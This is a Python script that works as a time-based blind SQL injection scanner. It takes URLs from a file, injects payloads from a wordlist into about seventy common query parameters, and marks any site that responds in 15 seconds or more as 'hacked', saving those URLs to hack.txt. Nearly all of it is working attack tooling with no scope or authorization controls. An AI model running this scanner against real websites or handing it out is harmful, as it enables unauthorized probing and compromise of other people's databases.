import re
import subprocess
import time
from termcolor import colored
import requests
import chardet


# Read the list of URLs to test from a file
with open("urls.txt", "rb") as f:
    raw_data = f.read()
    result = chardet.detect(raw_data)
    encoding = result["encoding"]

with open("urls.txt", "r", encoding="utf-8") as f:
    urls = [line.strip() for line in f.readlines()]


# Define list of words to filter URLs
filter_words = ["id=", "select=", "report=", "artist=", "search=", "message_id=", "follower_id=", "user_agent=", "cookie=", "referer=", "document_id=", "post_id=", "comment_id=", "event_id=", "booking_id=", "ticket_id=", "track_id=", "image_id=", "invoice_id=", "subscription_id=", "feedback=", "category_id=", "order_id=", "transaction_id=", "country=", "zipcode=", "product_id=", "redirect=", "callback=", "action=", "avg=", "insert_into=", "values=", "address=", "user_id=", "search_term=", "filter_by=", "group_by=", "union=", "offset=", "grad=", "kat=", "role=", "update=", "query=", "user=", "name=", "sort=", "where=", "search=", "params=", "process=", "row=", "view=", "table=", "from=", "sel=", "results=", "sleep=", "fetch=", "order=", "keyword=", "column=", "field=", "delete=", "string=", "number=", "filter="]

# Set the list of payloads to test
with open("sql_wordlist.txt", "r") as f:
    payloads = [line.strip() for line in f.readlines()]

# Iterate through each URL and payload
vulnerable_urls = []
total_requests = len(urls) * len(payloads)
progress = 0

for url in urls:
    # Check if URL contains any filter word
    if not any(filter_word in url for filter_word in filter_words):
        continue

    for payload in payloads:
        try:
            # Escape single quotes in the payload
            payload = payload.replace("'", "''")

            # Find the filter word in the URL and inject the payload
            for filter_word in filter_words:
                if filter_word in url:
                    index = url.find(filter_word)
                    end_index = url.find('&', index)
                    if end_index == -1:
                        end_index = len(url)
                    modified_url = url[:index + len(filter_word)] + payload + url[end_index:]

                    # Send the request with the modified URL
                    response = requests.get(modified_url)

                    # Check if the response time is greater than 15 seconds
                    if response.elapsed.total_seconds() >= 15:
                        # Highlight vulnerable URLs in red bold
                        url_payload = re.sub(r":hacked$", "", modified_url)
                        print(colored(url_payload, 'red', attrs=['bold']) + colored(" hacked", 'white'))
                        vulnerable_urls.append(modified_url)
                    else:
                        # Print safe URLs in green text
                        print(colored(f"{modified_url} safe", 'green'))

                    # Print elapsed time
                    elapsed_time = round(response.elapsed.total_seconds(), 2)
                    print(f"Elapsed time: {elapsed_time}s")

                    # Update progress and calculate estimated remaining time
                    progress += 1
                    elapsed_seconds = response.elapsed.total_seconds()
                    remaining_seconds = (total_requests - progress) * (elapsed_seconds / progress)
                    remaining_hours = int(remaining_seconds // 3600)
                    remaining_minutes = int((remaining_seconds % 3600) // 60)
                    percent_complete = round(progress / total_requests * 100, 2)

                    # Print progress update
                    print(f"{colored('Progress:', 'blue')} {progress}/{total_requests} ({percent_complete}%) - {remaining_hours}h:{remaining_minutes:02d}m")

        except KeyboardInterrupt:
            print("Program interrupted by user. Saving vulnerable URLs to file...")
            break

        except Exception as e:
            print(f"An error occurred: {e}. Saving vulnerable URLs to file...")
            break

# Save vulnerable URLs to file
with open("hack.txt", "w") as f:
    for url in vulnerable_urls:
        f.write(url + "\n")

print("Vulnerable URLs saved to file.")
